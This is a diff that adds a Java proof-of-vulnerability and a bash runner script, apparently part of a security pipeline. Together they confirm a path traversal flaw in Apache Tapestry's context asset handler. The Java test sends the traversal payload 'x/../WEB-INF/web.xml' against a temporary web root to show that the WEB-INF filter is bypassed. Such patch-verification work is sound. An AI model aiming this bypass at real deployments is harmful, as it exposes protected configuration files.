+// Proof-of-Vulnerability for CWE-022 (Path Traversal) in Apache Tapestry's
+// context asset request handling.
+//
+// The vulnerable flow:
+//   ContextAssetRequestHandler.handleAssetRequest() builds a ChecksumPath and
+//   applies the `illegal` regex ("^((web|meta)-inf.*)|(.*\.tml$)") to the RAW,
+//   un-normalized resource path. It then calls rootContextResource.forFile(path),
+//   which collapses ".." segments (AbstractResource.forFile) BEFORE the resource
+//   is resolved to a real file (ContextResource.getRealFile -> new File(...)).
+//
+//   An attacker can therefore smuggle a request for a protected resource such as
+//   "WEB-INF/web.xml" by sending  "<checksum>/x/../WEB-INF/web.xml".
+//   The raw path "x/../WEB-INF/web.xml" does NOT match the illegal regex (it
+//   starts with "x"), so the guard is bypassed; forFile() then normalizes it to
+//   "WEB-INF/web.xml", and the handler streams the protected resource.
+//
+// This POV drives the REAL project code (ContextAssetRequestHandler ->
+// ChecksumPath -> AbstractResource.forFile -> ContextResource) and asserts that
+// a WEB-INF resource was actually reached and streamed.
+//
+// Exit 0  => vulnerable (protected WEB-INF resource was streamed via traversal).
+// Exit 1  => not vulnerable (a correct patch blocks the traversal/filter bypass).
+
+import org.apache.tapestry5.internal.services.ContextResource;
+import org.apache.tapestry5.internal.services.ResourceStreamer;
+import org.apache.tapestry5.internal.services.assets.ContextAssetRequestHandler;
+import org.apache.tapestry5.ioc.Resource;
+import org.apache.tapestry5.services.Context;
+import org.apache.tapestry5.services.assets.StreamableResource;
+
+import java.io.File;
+import java.net.URL;
+import java.util.List;
+import java.util.Set;
+
+public class ContextAssetTraversalPov
+{
+    // Records the path of the resource the framework tried to stream.
+    static String streamedPath = null;
+
+    public static void main(String[] args) throws Exception
+    {
+        // 1. Build a temporary web context root containing a "protected" file
+        //    under WEB-INF that the illegal-path filter is supposed to guard.
+        File webRoot = File.createTempFile("tapestry-pov-root", "");
+        webRoot.delete();
+        File webInf = new File(webRoot, "WEB-INF");
+        webInf.mkdirs();
+        File secret = new File(webInf, "web.xml");
+        try (java.io.FileWriter w = new java.io.FileWriter(secret))
+        {
+            w.write("<web-app>SECRET-CONTEXT-DESCRIPTOR</web-app>");
+        }
+
+        // 2. A Context backed by that root. getRealFile resolves paths under it,
+        //    exactly like ContextImpl over a servlet container.
+        final File root = webRoot;
+        Context context = new Context()
+        {
+            public URL getResource(String path) { return null; }
+
+            public File getRealFile(String path)
+            {
+                String p = path.startsWith("/") ? path.substring(1) : path;
+                return new File(root, p);
+            }
+
+            public String getInitParameter(String name) { return null; }
+            public List<String> getResourcePaths(String path) { return null; }
+            public Object getAttribute(String name) { return null; }
+            public List<String> getAttributeNames() { return null; }
+            public String getMimeType(String file) { return null; }
+        };
+
+        // 3. The application's root context resource (path "").
+        Resource rootContextResource = new ContextResource(context, "");
+
+        // 4. A ResourceStreamer that records what the handler decided to stream.
+        ResourceStreamer streamer = new ResourceStreamer()
+        {
+            public boolean streamResource(Resource resource, String providedChecksum, Set<Options> options)
+            {
+                streamedPath = resource.getPath();
+                return true;
+            }
+
+            public boolean streamResource(StreamableResource resource, String providedChecksum, Set<Options> options)
+            {
+                return true;
+            }
+        };
+
+        ContextAssetRequestHandler handler = new ContextAssetRequestHandler(streamer, rootContextResource);
+
+        // 5. Malicious asset request: "<checksum>/x/../WEB-INF/web.xml".
+        //    Raw resource path is "x/../WEB-INF/web.xml" (bypasses the filter),
+        //    normalized by forFile() to "WEB-INF/web.xml".
+        String extraPath = "0000checksum/x/../WEB-INF/web.xml";
+
+        boolean handled = handler.handleAssetRequest(null, null, extraPath);
+
+        System.out.println("[pov] handleAssetRequest returned: " + handled);
+        System.out.println("[pov] streamed resource path:     " + streamedPath);
+
+        boolean traversed =
+                handled
+                && streamedPath != null
+                && streamedPath.toLowerCase().startsWith("web-inf");
+
+        if (traversed)
+        {
+            System.out.println("[pov] VULNERABLE: protected WEB-INF resource reached via path traversal / filter bypass.");
+            System.exit(0);
+        }
+        else
+        {
+            System.out.println("[pov] NOT VULNERABLE: traversal to WEB-INF was blocked.");
+            System.exit(1);
+        }
+    }
+}

+#!/usr/bin/env bash
+# Builds the project's main classes (if needed), compiles the POV against the
+# real Tapestry classes, and runs it. Exit 0 == vulnerable, non-zero == patched.
+set -eu
+
+cd "$(dirname "$0")/../.."   # -> /workspace/repo
+
+POV_DIR=".security-pipeline/pov"
+OUT="$POV_DIR/out"
+mkdir -p "$OUT"
+
+# Ensure the vulnerable module (and its deps) are compiled.
+if [ ! -e "tapestry-core/build/classes/main/org/apache/tapestry5/internal/services/assets/ContextAssetRequestHandler.class" ]; then
+  ./gradlew --no-daemon :tapestry-core:compileJava -q
+fi
+
+# Classpath: every module's compiled main classes (module layouts differ:
+# some use build/classes/main, commons uses target/gradle-build/classes/main)
+# plus the servlet-api jar.
+CP="$(find . -type d -path '*/classes/main' 2>/dev/null | tr '\n' ':')"
+SERVLET_JAR="$(find "$HOME/.gradle/caches" -name 'servlet-api-*.jar' 2>/dev/null | head -n1)"
+CP="$CP$SERVLET_JAR"
+
+javac -cp "$CP" -d "$OUT" "$POV_DIR/ContextAssetTraversalPov.java"
+
+java -cp "$OUT:$CP" ContextAssetTraversalPov
